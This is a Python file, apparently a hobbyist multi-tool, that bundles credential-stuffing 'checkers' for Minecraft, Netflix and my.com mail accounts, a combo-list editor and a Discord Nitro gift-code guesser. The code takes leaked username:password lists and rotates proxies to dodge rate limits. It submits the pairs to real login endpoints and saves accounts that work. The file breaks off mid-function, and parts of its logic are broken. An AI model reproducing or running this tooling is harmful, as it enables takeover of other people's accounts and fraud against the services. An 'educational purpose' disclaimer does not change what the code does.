from __future__ import division
from progressbar import ProgressBar
from mechanize import Browser
from os import path
from random import randint
from time import sleep
import os
import tkinter
from tkinter import filedialog

import colorama
from colorama import Fore
from time import sleep
import os
import tkinter

root = tkinter.Tk()
root.withdraw()

import random
import sys
import time
import pygame 
typing_speed = 50 #wpm
def slow_type(t):
    for l in t:
        sys.stdout.write(l)
        sys.stdout.flush()
        time.sleep(random.random()*10.0/typing_speed)
    print('')

Title1 = ( """
██╗░░██╗
╚██╗██╔╝
░╚███╔╝░
░██╔██╗░
██╔╝╚██╗
╚═╝░░╚═╝""")

Title2 = ("""
███████╗
██╔════╝
█████╗░░
██╔══╝░░
██║░░░░░
╚═╝░░░░░""")

Title3 = ("""
██╗
██║
██║
██║
██║
╚═╝""")

Title4 = ("""
██████╗░
██╔══██╗
██████╔╝
██╔══██╗
██║░░██║
╚═╝░░╚═╝""")

Title5 = ("""
███████╗
██╔════╝
█████╗░░
██╔══╝░░
███████╗
╚══════╝""")

os.system('cls')

print(Fore.CYAN+"""
\t\t\t\t██╗░░██╗███████╗██╗██████╗░███████╗
\t\t\t\t╚██╗██╔╝██╔════╝██║██╔══██╗██╔════╝
\t\t\t\t░╚███╔╝░█████╗░░██║██████╔╝█████╗░░
\t\t\t\t░██╔██╗░██╔══╝░░██║██╔══██╗██╔══╝░░
\t\t\t\t██╔╝╚██╗██║░░░░░██║██║░░██║███████╗
\t\t\t\t╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚══════╝""")

print("Getting ready....")
sleep(3)

pygame.mixer.init()
pygame.mixer.music.load("sound1.wav")
pygame.mixer.music.play()
slow_type("These tools are for educational purpose I am not responsible for any activities against rules\n")
slow_type("1| Minecraft Checker\n2| Netflix Checker\n3| Spotify Checker\n4| Proxy Scrapper\n5| NordVPN Checker\n6| Nitro Gen + Checker\n7| Combo Editor\n8| Proxy Checker\n")
a = input("Please Enter Which Module You Want To Use: ")

def combo_editor():
    import tkinter,os,time
    from colorama import Fore, init, Style
    from tkinter import filedialog, messagebox
    init(convert = True)
    root = tkinter.Tk()
    root.withdraw()
    amount = 0
    os.system("title // Combo Editor")
    logo = f"""
    {Fore.YELLOW} >  ██████╗ ██████╗ ███╗   ███╗██████╗  ██████╗ 
    {Fore.YELLOW} > ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔═══██╗
    {Fore.YELLOW} > ██║     ██║   ██║██╔████╔██║██████╔╝██║   ██║
    {Fore.YELLOW} > ██║     ██║   ██║██║╚██╔╝██║██╔══██╗██║   ██║
    {Fore.YELLOW} > ╚██████╗╚██████╔╝██║ ╚═╝ ██║██████╔╝╚██████╔╝
    {Fore.YELLOW} >  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═════╝  ╚═════╝ 
                                                
    {Fore.YELLOW} > ███████╗██████╗ ██╗████████╗ ██████╗ ██████╗ 
    {Fore.YELLOW} > ██╔════╝██╔══██╗██║╚══██╔══╝██╔═══██╗██╔══██╗
    {Fore.YELLOW} > █████╗  ██║  ██║██║   ██║   ██║   ██║██████╔╝
    {Fore.YELLOW} > ██╔══╝  ██║  ██║██║   ██║   ██║   ██║██╔══██╗
    {Fore.YELLOW} > ███████╗██████╔╝██║   ██║   ╚██████╔╝██║  ██║
    {Fore.YELLOW} > ╚══════╝╚═════╝ ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
    """#i was gonna do something fancy but liked the yellow theme so just ignore xd
    print(logo)

    option = input(" > Assuming your list is username:password\n > How would you like it sorted?\n > (1) username\n > (2) password \n > (3) password:username\n >  ")

    os.system("cls")
    print(logo)
    print(f" > Assuming your list is username:password\n > how would you like it sorted?\n > (1) username\n > (2) password \n > (3) password:username\n > ({option})\n")
    #looks smooth xd
    if "1" in option:
        print(" > Sorting to get usernames")
    elif "2" in option:
        print(" > Sorting to get passwords!")
    elif "3" in option:
        print(" > Sorting to make it password:username")
    else:
        input(" > Invalid option, press enter to quit\n > ")
        os._exit(0)

    time.sleep(0.5)
    print(" > Select your combo file!")
    time.sleep(0.8)

    filepath = filedialog.askopenfile(parent=root, mode='rb', title='Select the file containing the combos!',
                                filetype=(("txt", "*.txt"), ("All files", "*.txt")))

    nameoffinalfile = input(" > Name of file to store the results in?\n > ")

    finalfileextension = nameoffinalfile[-4:]
    if finalfileextension != ".txt": #detecting if the full file name has been inputted..
        nameoffinalfile = nameoffinalfile+".txt"

    with open(filepath.name) as f:
        for i, l in enumerate(f):
            pass
    totalamount = i + 1

    print(" > Sorting Now!")
    time.sleep(1)
    with open(filepath.name, 'r') as f:
        for line in f.readlines():
            try:
                print(f" > {line.strip()}")
                emailandpass = line.strip().split(':') 
                email = emailandpass[0]
                password = emailandpass[1]
                f = open(nameoffinalfile, "a")
                if "1" in option:
                    f.write(f"{email} \n")
                elif "2" in option:
                    f.write(f"{password} \n")
                elif "3" in option:
                    f.write(f"{password}:{email} \n")
                f.close()
            except:
                pass
            amount = amount + 1
            os.system(f"title Combo Editor // [{amount}] : [{totalamount}]")
            #pretty sure this slowed it down A LOT but it looks smoothe so :flushed:


    print(" > Finished sorting")
    os.system(nameoffinalfile)

def minecraft():
    import requests, os, threading, sys, time, random, ctypes, webbrowser,re, hashlib, datetime, os.path, tkinter
    from colorama import Fore, init
    from re import search
    import datetime
    from tkinter import filedialog, messagebox
    e = datetime.datetime.now()

    current_date = e.strftime("%Y-%m-%d-%H-%M-%S")

    root = tkinter.Tk()
    root.withdraw()

    if not os.path.exists("results"):
        os.makedirs("results/")
    if not os.path.exists('results/minecraft'):
        os.makedirs('results/minecraft')
    if not os.path.exists('results/mail_access'):
        os.makedirs('results/mail_access')
    if not os.path.exists('results/mail_access/{}'.format(current_date)):
        os.makedirs('results/mail_access/{}'.format(current_date))
    if not os.path.exists('results/minecraft/{}'.format(current_date)):
        os.makedirs('results/minecraft/{}'.format(current_date))

    init()
    blue, red, white, green = Fore.BLUE, Fore.RED, Fore.WHITE, Fore.GREEN
    global emails, passwords
    emails = []
    passwords = []
    proxylist = []
    good, bad, cpm1, cpm2, checked, banned, errors = 0, 0, 0, 0, 0, 0, 0
    messages = ["//Fire Coded This", "Fire good dev", "rainproxy.io -> \"Good Proxies\"", "Fire is good", "python easy, took me 10s to make this hah xD"]
    logo = f"""
    {blue}___  _ _____ _  ____  _____  
    \  \///    // \/  __\/  __/  
    \  / |  __\| ||  \/||  \    
    /  \ | |   | ||    /|  /_   
    /__/\\\_/   \_/\_/\_\\____\  
                                {white}
    
                                                                                    """

    def load_combos():
        global emails, passwords
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("xFire Checker - //Fire")
        print("\n" + logo + "\n")
        print("  Coded by //Fire - \"{}\"".format(random.choice(messages)))
        print()
        input("  Press ENTER to select combos..")
        fileNameCombo = filedialog.askopenfile(parent=root, mode='rb', title='Choose a combo file',
                                    filetype=(("txt", "*.txt"), ("All files", "*.txt")))
        if fileNameCombo is None:
            print()
            print("  Please select valid combo file..")
            time.sleep(2)
            start()
        else:
            try:
                with open(fileNameCombo.name, 'r+', encoding='utf-8') as e:
                    ext = e.readlines()
                    for line in ext:
                        try:
                            email = line.split(":")[0].replace('\n', '')
                            password = line.split(":")[1].replace('\n', '')
                            emails.append(email)
                            passwords.append(password)
                        except:
                            pass
                print("  Loaded [{}] combos lines..".format(len(emails)))
                time.sleep(2)
            except Exception:
                print("  Your combo file is probably harmed, please try again..")
                time.sleep(2)
                start()
    def load_proxies():
        global proxylist
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("xFire Checker - //Fire")
        print("\n" + logo + "\n")
        print("  Coded by //Fire - \"{}\"".format(random.choice(messages)))
        print()
        input("  Press ENTER to select proxies..")
        fileNameProxy = filedialog.askopenfile(parent=root, mode='rb', title='Choose a proxy file',
                                    filetype=(("txt", "*.txt"), ("All files", "*.txt")))
        if fileNameProxy is None:
            print()
            print("  Please select valid proxy file..")
            time.sleep(2)
            start()
        else:
            try:
                with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                    ext = e.readlines()
                    for line in ext:
                        try:
                            proxyline = line.split()[0].replace('\n', '')
                            proxylist.append(proxyline)
                        except:
                            pass
                print("  Loaded [{}] proxies lines..".format(len(proxylist)))
                time.sleep(2)
            except Exception:
                print("  Your proxy file is probably harmed, please try again..")




    def main():
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("xFire Checker - //Fire")
        print("\n" + logo + "\n")
        print("  Coded by //Fire - \"{}\"".format(random.choice(messages)))
        print()
        print("  Where do you wanna go")
        print("\n  [1] Checker\n  [2] Mail Access\n  [3] \n  [4] Credits\n  [5] Quit")
        try:
            question = int(input("  "))
        except Exception:
            print("Invalid input..")
            time.sleep(2)
            main()
        if question == 1:
            start()
        elif question == 2:
            start_mail()
        elif question == 3:
            webbrowser.open_new("https://hastebin.com/tetofaxiki.nginx")
            main()
        elif question == 4:
            os.system('cls')
            ctypes.windll.kernel32.SetConsoleTitleW("xFire Checker - //Fire")
            print("\n" + logo + "\n")
            print("  Coded by //Fire - \"{}\"".format(random.choice(messages)))
            print()
            print("  Developer: //Fire#7777\n  Owner: //Fire#7777")
            print()
            input("  Press ENTER to get on menu..")
            main()
        elif question == 5:
            print("  We are closing..")
            time.sleep(2)
            sys.exit()
        else:
            print("  Invalid input..")
            time.sleep(2)
            main()

    def screen_mc():
        global checked, bad, good, cpm1, cpm2, banned, errors
        cpm2 = cpm1
        cpm1 = 0
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("xFire Checker - //Fire")
        print("\n" + logo + "\n")
        print("  Coded by //Fire - \"{}\"".format(random.choice(messages)))
        print()
        print("  Checking Minecraft Accounts..")
        print()
        print("  Checked: [{}/{}]".format(checked, len(emails)))
        print("  Good: [{}]".format(good))
        print("  Bad: [{}]".format(bad))
        print("  Banned: [{}]".format(banned))
        print("  Cpm: [{}]".format(cpm2*60))
        print("  Errors: [{}]".format(errors))
        time.sleep(1)
        threading.Thread(target=screen_mc, args=()).start()

    def screen_mail():
        global checked, bad, good, cpm1, cpm2, banned, errors
        cpm2 = cpm1
        cpm1 = 0
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("xFire Checker - //Fire")
        print("\n" + logo + "\n")
        print("  Coded by //Fire - \"{}\"".format(random.choice(messages)))
        print()
        print("  Checking Mail Access Accounts..")
        print()
        print("  Checked: [{}/{}]".format(checked, len(emails)))
        print("  Good: [{}]".format(good))
        print("  Bad: [{}]".format(bad))
        print("  Banned: [{}]".format(banned))
        print("  Cpm: [{}]".format(cpm2*60))
        print("  Errors: [{}]".format(errors))
        time.sleep(1)
        threading.Thread(target=screen_mail, args=()).start()

    def check_mail(email, password, proxylist, proxy_type):
        global checked, bad, good, cpm1, cpm2, banned, errors
        try:
            sess = requests.Session()
            if proxy_type == "https":
                proxy_to_use = random.choice(proxylist)
                try: 
                    x = proxy_to_use.split(":")
                    if len(x) == 2:
                        proxies = {'http': f'http://{proxy_to_use}', 'https': f'https://{proxy_to_use}'}
                        sess.proxies = proxies
                    elif len(x) == 4:
                        proxies = {'http': f'http://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}', 'https': f'https://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}'}
                        sess.proxies = proxies
                    else:
                        pass
                except Exception:
                    pass
            elif proxy_type == "socks4":
                try: 
                    x = proxy_to_use.split(":")
                    if len(x) == 2:
                        proxies = {'http': f'socks4://{proxy_to_use}'}
                        sess.proxies = proxies
                    elif len(x) == 4:
                        proxies = {'http': f'socks4://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}'}
                        sess.proxies = proxies
                    else:
                        pass
                except Exception:
                    pass
            elif proxy_type == "socks5":
                try: 
                    x = proxy_to_use.split(":")
                    if len(x) == 2:
                        proxies = {'http': f'socks5://{proxy_to_use}'}
                        sess.proxies = proxies
                    elif len(x) == 4:
                        proxies = {'http': f'socks5://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}'}
                        sess.proxies = proxies
                    else:
                        pass
                except Exception:
                    pass
            else:
                pass
            url1 = "https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={}&Password={}".format(email, password) 
            headers = {
                "User-Agent": "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0"
            }
            f = sess.get(url1, headers=headers)
            if "Ok=1" in f.text:
                good+=1
                checked+=1
                cpm1+=1
                open('results/mail_access/{}/good.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
            elif "Ok=0" in f.text:
                bad+=1
                checked+=1
                cpm1+=1
                open('results/mail_access/{}/bad.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
            else:
                banned+=1
                checked+=1
                cpm1+=1
                open('results/mail_access/{}/banned.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
        except Exception:
            errors+=1

    def check(email, password, proxylist, proxy_type):
        global checked, bad, good, cpm1, cpm2, banned, errors
        try:
            sess = requests.Session()
            if proxy_type == "https":
                proxy_to_use = random.choice(proxylist)
                try: 
                    x = proxy_to_use.split(":")
                    if len(x) == 2:
                        proxies = {'http': f'http://{proxy_to_use}', 'https': f'https://{proxy_to_use}'}
                        sess.proxies = proxies
                    elif len(x) == 4:
                        proxies = {'http': f'http://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}', 'https': f'https://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}'}
                        sess.proxies = proxies
                    else:
                        pass
                except Exception:
                    pass
            elif proxy_type == "socks4":
                try: 
                    x = proxy_to_use.split(":")
                    if len(x) == 2:
                        proxies = {'http': f'socks4://{proxy_to_use}'}
                        sess.proxies = proxies
                    elif len(x) == 4:
                        proxies = {'http': f'socks4://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}'}
                        sess.proxies = proxies
                    else:
                        pass
                except Exception:
                    pass
            elif proxy_type == "socks5":
                try: 
                    x = proxy_to_use.split(":")
                    if len(x) == 2:
                        proxies = {'http': f'socks5://{proxy_to_use}'}
                        sess.proxies = proxies
                    elif len(x) == 4:
                        proxies = {'http': f'socks5://{proxy_to_use[2]}:{proxy_to_use[3]}@{proxy_to_use[0]}:{proxy_to_use[1]}'}
                        sess.proxies = proxies
                    else:
                        pass
                except Exception:
                    pass
            else:
                pass
            url1 = "https://api.mojang.com/profiles/minecraft" 
            content = "[\"{}\"]".format(email)
            headers = {
                "Content-Type":"application/json", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                "Pragma":"no-cache",
                "Accept":"*/*" 
            }
            f = sess.post(url1, data=content, headers=headers)
            if "legacy\":true" in f.text:
                cpm1+=1
                result = hashlib.md5(b'{}'.format(email))
                api = "https://authserver.mojang.com/authenticate"
                data = {"agent":{"name": "Minecraft", "version": 1}, "clientToken": result,"password": password,"requestUser": "true", "username": email}
                headers = {
                    "Content-Type":"application/json", 
                    "User-Agent": "MinecraftLauncher/1.0", 
                    "Pragma": "no-cache", 
                    "Accept": "*/*" 
                }
                r = sess.post(api, json=data, headers=headers)
                if "errorMessage\":\"Invalid credentials. Invalid username or password." in r.text:
                    bad+=1
                    checked+=1
                    cpm1+=1
                    open('results/minecraft/{}/bad.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
                elif "accessToken" or "passwordChangedAt" in r.text:
                    good+=1
                    checked+=1
                    cpm1+=1
                    open('results/minecraft/{}/good.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
                else:
                    banned+=1
                    checked+=1
                    cpm1+=1
                    open('results/minecraft/{}/banned.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
            elif "[]" or "legacy\":false" or "id" in f.text:
                bad+=1
                checked+=1
                cpm1+=1
                open('results/minecraft/{}/bad.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
            elif "The client has sent too many requests within a certain amount of time" in f.text:
                banned+=1
                checked+=1
                cpm1+=1
                open('results/minecraft/{}/banned.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
            elif "legacy" not in f.text:
                bad+=1
                checked+=1
                cpm1+=1
                open('results/minecraft/{}/bad.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
            else:
                banned+=1
                checked+=1
                cpm1+=1
                open('results/minecraft/{}/banned.txt'.format(current_date), 'a+').write("{}:{}\n".format(email, password))
        except Exception:
            errors+=1
    def start_mail():
        global emails, passwords, proxylist
        emails.clear()
        passwords.clear()
        proxylist.clear()
        load_combos()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("xFire Checker - //Fire")
        print("\n" + logo + "\n")
        print("  Coded by //Fire - \"{}\"".format(random.choice(messages)))
        print()
        print("  What type of proxies you want to use?")
        print("\n  [1] http/s\n  [2] socks4\n  [3] socks5")
        try:
            proxy_type = int(input("  "))
        except Exception:
            print("  Invalid input..")
            time.sleep(2)
            start()
        if proxy_type == 1:
            proxy_new = "https"
        elif proxy_type == 2:
            proxy_new = "socks4"
        elif proxy_type == 3:
            proxy_new == "socks5"
        else:
            print("  Invalid input..")
            time.sleep(2)
            start()
        load_proxies()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("xFire Checker - //Fire")
        print("\n" + logo + "\n")
        print("  Coded by //Fire - \"{}\"".format(random.choice(messages)))
        print()
        print("  How many threads do you want to use? [Max 1000]")
        try:
            threads = int(input("  "))
        except Exception:
            print("  Invalid input..")
            time.sleep(2)
            start()
        if threads > 1000:
            print("  Maximum thread value is {}1000{}".format(blue, blue))
            time.sleep(2)
            start()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Checker - By ExtremeDev")
        print("\n" + logo + "\n")
        print("  Coded by ExtremeDev - \"{}\"".format(random.choice(messages)))
        print()
        print("  Running checker..")
        time.sleep(1.5)
        screen_mail()
        num = 0
        while 1:
            if threading.active_count() < int(threads):
                if len(emails) > num:
                    try:
                        threading.Thread(target=check_mail, args=(emails[num], passwords[num], proxylist, proxy_type,)).start()
                        num+=1
                    except:
                        print("Checked all.")
                        time.sleep(5)
                        print()
                        input("Press any key to close checker.")

    def start():
        global emails, passwords
        
        emails.clear()
        passwords.clear()
        proxylist.clear()
        load_combos()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("xFire Checker - //Fire")
        print("\n" + logo + "\n")
        print("  Coded by //Fire - \"{}\"".format(random.choice(messages)))
        print()
        print("  What type of proxies you want to use?")
        print("\n  [1] http/s\n  [2] socks4\n  [3] socks5")
        try:
            proxy_type = int(input("  "))
        except Exception:
            print("  Invalid input..")
            time.sleep(2)
            start()
        if proxy_type == 1:
            proxy_new = "https"
        elif proxy_type == 2:
            proxy_new = "socks4"
        elif proxy_type == 3:
            proxy_new == "socks5"
        else:
            print("  Invalid input..")
            time.sleep(2)
            start()
        load_proxies()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("xFire Checker - //Fire")
        print("\n" + logo + "\n")
        print("  Coded by //Fire - \"{}\"".format(random.choice(messages)))
        print()
        print("  How many threads do you want to use? [Max 1000]")
        try:
            threads = int(input("  "))
        except Exception:
            print("  Invalid input..")
            time.sleep(2)
            start()
        if threads > 1000:
            print("  Maximum thread value is {}1000{}".format(red, red))
            time.sleep(2)
            start()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("xFire Checker - //Fire")
        print("\n" + logo + "\n")
        print("  Coded by //Fire - \"{}\"".format(random.choice(messages)))
        print()
        print("  Running checker..")
        time.sleep(1.5)
        screen_mc()
        num = 0
        while 1:
            if threading.active_count() < int(threads):
                if len(emails) > num:
                    try:
                        threading.Thread(target=check, args=(emails[num], passwords[num], proxylist, proxy_type,)).start()
                        num+=1
                    except:
                        print("Checked all.")
                        time.sleep(5)
                        print()
                        input("Press any key to close checker.")


    main()


def netflix():


    root = tkinter.Tk()
    root.withdraw()

    working=[]
    dead=[]
    notActive=[]
    br = Browser()

    def testAccount(email,password,typeProxy):
                global currentProxy
                global br

                logoutURL = 'https://www.netflix.com/SignOut?lnkctr=mL'
                page = 'Sorry, we are unable to process your request.'
                while (page.find('Sorry, we are unable to process your request.') != -1):
                    try:
                        proxies("Default")
                        loginURL = 'https://www.netflix.com/in/login'
                        br.set_handle_equiv(True)
                        br.set_handle_redirect(True)
                        br.set_handle_referer(True)
                        br.set_handle_robots(False)
                        br.addheaders = [('User-agent', 'Firefox')]
                        if (currentProxy != ''):
                            if (typeProxy != 'HTTP'):
                                br.set_proxies({"socks5": currentProxy})
                            else:
                                br.set_proxies({"HTTP": currentProxy})
                        else:
                            br.set_proxies()
                        br.open(loginURL)
                        br.select_form(nr=0)
                        br.form['userLoginId'] = email
                        br.form['password'] = password
                        response = br.submit()
                
                        if (response.code == 200):
                            page = response.read().decode()
                            if (page.find('Sorry, we are unable to process your request.') != -1):
                                pass
                            elif (response.geturl().find('browse') != -1):
                                br.open(logoutURL)
                                working.append(email+':'+password+'\n')
                            elif (page.find('Finish Sign-up') != -1):
                                br.open(logoutURL)
                                notActive.append(email+':'+password)
                            elif (response.geturl().find('getstarted') != -1):
                                br.open(logoutURL)
                                notActive.append(email+':'+password)
                            elif (response.code == 500):
                                errorFile = open('error.txt', 'a+')
                                errorFile.write('500-Bad Gateway: currentProxy')
                                errorFile.close()
                            elif (page.find('Incorrect password') != -1):
                                dead.append(email+':'+password)
                            elif (page.find('find an account with this email address.') != -1):
                                dead.append(email+':'+password)
                            else:
                                print('Unknown Error. (7)')
                                errorFile = open('error.txt', 'a+')
                                errorFile.write(response.geturl()+'\n'+page)
                                errorFile.close()
                        else:
                            print('Error: '+str(response.code)+' Trying again.')
                    except Exception as errorMsg:
                        print (response.geturl().find('getstarted'))
                        errorFile = open('error.txt', 'a+')
                        errorFile.write(response.geturl()+'\n'+page)
                        errorFile.close()    
                        br.open(logoutURL)
                        sleep(3)

    def writeToFile():
        global working
        global dead
        global notActive

        workingAccounts = open('workingAccounts.txt', 'w+')
        deadAccounts = open('deadAccounts.txt', 'w+')
        nonActiveFile = open('notActive.txt', 'w+')
        for all in working:
            workingAccounts.write(all)
        for all in dead:
            deadAccounts.write(all)
        for all in notActive:
            nonActiveFile.write(all)
        workingAccounts.close()
        deadAccounts.close()
        nonActiveFile.close()
        print ('')
        print ('Summary:')
        print ('--------')
        print ('')
        print ('Working accounts: ' + str(len(working)))
        print ('Inactive Accounts: '+ str(len(notActive)))
        print ('Dead accounts: ' + str(len(dead)))
        print ('')

    def proxies(country):
        global currentProxy
        proxyFile = "proxy-Default.txt"
        if (path.exists(proxyFile) and path.getsize(proxyFile) > 0):
            lines = open(proxyFile, "r")
            filestream = open(proxyFile, "r")
            randomProxyID = randint(0,sum(1 for row in lines) - 1)
            for proxyID, proxy in enumerate(filestream):
                if (proxyID == randomProxyID):
                    currentProxy = proxy
                    break
            filestream.close()
        else:
            currentProxy = ''

    def main():   
        global debug
        global working
        global dead

        print('')
        print ('#######        ####')
        print ('#### ####      ####')
        print ('####  ####     ####')
        print ('####   ####    ####')
        print ('####    ####   ####')
        print ('####     ####  ####')
        print ('####      #### ####')
        print ('####        #######')
        print ('')

        try:
            accounts = filedialog.askopenfile(parent=root, mode='rb', title='Choose a combo file',
                                    filetype=(("txt", "*.txt"), ("All files", "*.txt")))
            if (path.exists(accounts) and path.getsize(accounts) > 0):
                progress = 0
                maxValue = sum(1 for acc in open(accounts))
                pbar = ProgressBar(max_value=maxValue).start()
                with open(accounts, "r") as filestream: 
                    for line in filestream:
                        pbar.update(progress)
                        progress += 1
                        accountArgument = line.split(':')
                        args = len(accountArgument)
                        if (args == 3 or args == 2):
                            email = accountArgument[0]
                            password = accountArgument[1]
                            testAccount(email,password,'HTTP')
                        else:
                            print('Account List is not formatted properly.')
                
                pbar.finish()
                writeToFile()
            else:
                print('Accounts file is empty!')
                print('')
        except Exception as errorMsg:
            print('')
            print(errorMsg)
            print('An error occurred.. Saving progress...')
            print('')
            writeToFile()

    if __name__ == "__main__":
        main()

def nitro():
    import time
    import os



    time.sleep(3)
    os.system('cls' if os.name == 'nt' else 'clear')

    import random
    import string
    import ctypes

    try: # Check if the requrements have been installed
        from discord_webhook import DiscordWebhook # Try to import discord_webhook
    except ImportError: # If it chould not be installed
        input(f"Module discord_webhook not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install discord_webhook'\nPress enter to exit") # Tell the user it has not been installed and how to install it
        exit() # Exit the program
    try: # Setup try statement to catch the error
        import requests # Try to import requests
    except ImportError: # If it has not been installed
        input(f"Module requests not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests'\nPress enter to exit")# Tell the user it has not been installed and how to install it
        exit() # Exit the program


    class NitroGen: # Initialise the class
        def __init__(self): # The initaliseaiton function
            self.fileName = "Nitro Codes.txt" # Set the file name the codes are stored in

        def main(self): # The main function contains the most important code
            os.system('cls' if os.name == 'nt' else 'clear') # Clear the screen
            if os.name == "nt": # If the system is windows
                print("")
                ctypes.windll.kernel32.SetConsoleTitleW("Nitro Generator and Checker - Made by Drillenissen#4268") # Change the
            else: # Or if it is unix
                print(f'\33]0;Nitro Generator and Checker - Made by lol\a', end='', flush=True) # Update title of command prompt

            print("""
                            nitro                               """) # Print the title card
            time.sleep(2) # Wait a few seconds
            self.slowType("Made by: //Fire#7777", .02) # Print who developed the code
            time.sleep(1) # Wait a little more
            self.slowType("\nInput How Many Codes to Generate and Check: ", .02, newLine = False) # Print the first question

            num = int(input('')) # Ask the user for the amount of codes

            # Get the webhook url, if the user does not wish to use a webhook the message will be an empty string
            self.slowType("\nDo you wish to use a discord webhook? \nIf so type it here or press enter to ignore: ", .02, newLine = False)
            url = input('') # Get the awnser
            webhook = url if url != "" else None # If the url is empty make it be None insted

            # print() # Print a newline for looks

            valid = [] # Keep track of valid codes
            invalid = 0 # Keep track of how many invalid codes was detected

            for i in range(num): # Loop over the amount of codes to check
                try: # Catch any errors that may happen
                    code = "".join(random.choices( # Generate the id for the gift
                        string.ascii_uppercase + string.digits + string.ascii_lowercase,
                        k = 16
                    ))
                    url = f"https://discord.gift/{code}" # Generate the url

                    result = self.quickChecker(url, webhook) # Check the codes

                    if result: # If the code was valid
                        valid.append(url) # Add that code to the list of found codes
                    else: # If the code was not valid
                        invalid += 1 # Increase the invalid counter by one
                except Exception as e: # If the request fails
                    print(f" Error | {url} ") # Tell the user an error occurred

                if os.name == "nt": # If the system is windows
                    ctypes.windll.kernel32.SetConsoleTitleW(f"Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by Drillenissen#4268") # Change the title
                    print("")
                else: # If it is a unix system
                    print(f'\33]0;Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by Drillenissen#4268\a', end='', flush=True) # Change the title

            print(f"""
    Results:
    Valid: {len(valid)}
    Invalid: {invalid}
    Valid Codes: {', '.join(valid )}""") # Give a report of the results of the check

            input("\nThe end! Press Enter 5 times to close the program.") # Tell the user the program finished
            [input(i) for i in range(4,0,-1)] # Wait for 4 enter presses


        def slowType(self, text, speed, newLine = True): # Function used to print text a little more fancier
            for i in text: # Loop over the message
                print(i, end = "", flush = True) # Print the one charecter, flush is used to force python to print the char
                time.sleep(speed) # Sleep a little before the next one
            if newLine: # Check if the newLine argument is set to True
                print() # Print a final newline to make it act more like a normal print statement

        def generator(self, amount): # Function used to generate and store nitro codes in a seperate file
            with open(self.fileName, "w", encoding="utf-8") as file: # Load up the file in write mode
                print("Wait, Generating for you") # Let the user know the code is generating the codes

                start = time.time() # Note the initaliseation time

                for i in range(amount): # Loop the amount of codes to generate
                    code = "".join(random.choices(
                        string.ascii_uppercase + string.digits + string.ascii_lowercase,
                        k = 16
                    )) # Generate the code id

                    file.write(f"https://discord.gift/{code}\n") # Write the code

                # Tell the user its done generating and how long tome it took
                print(f"Genned {amount} codes | Time taken: {round(time.time() - start, 5)}s\n") #

        def fileChecker(self, notify = None): # Function used to check nitro codes from a file
            valid = [] # A list of the valid codes
            invalid = 0 # The amount of invalid codes detected
            with open(self.fileName, "r", encoding="utf-8") as file: # Open the file containing the nitro codes
                for line in file.readlines(): # Loop over each line in the file
                    nitro = line.strip("\n") # Remove the newline at the end of the nitro code

                    # Create the requests url for later use
                    url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"

                    response = requests.get(url) # Get the responce from the url

                    if response.status_code == 200: # If the responce went through
                        print(f" Valid | {nitro} ") # Notify the user the code was valid
                        valid.append(nitro) # Append the nitro code the the list of valid codes

                        if notify is not None: # If a webhook has been added
                            DiscordWebhook( # Send the message to discord letting the user know there has been a valid nitro code
                                url = notify,
                                content = f"Valid Nito Code detected! @everyone \n{nitro}"
                            ).execute()
                        else: # If there has not been a discord webhook setup just stop the code
                            break # Stop the loop since a valid code was found

                    else: # If the responce got ignored or is invalid ( such as a 404 or 405 )
                        print(f" Invalid | {nitro} ") # Tell the user it tested a code and it was invalid
                        invalid += 1 # Increase the invalid counter by one

            return {"valid" : valid, "invalid" : invalid} # Return a report of the results

        def quickChecker(self, nitro, notify = None): # Used to check a single code at a time
            # Generate the request url
            url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
            response = requests.get(url) # Get the response from discord

            if response.status_code == 200: # If the responce went through
                print(f" Valid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") # Notify the user the code was valid
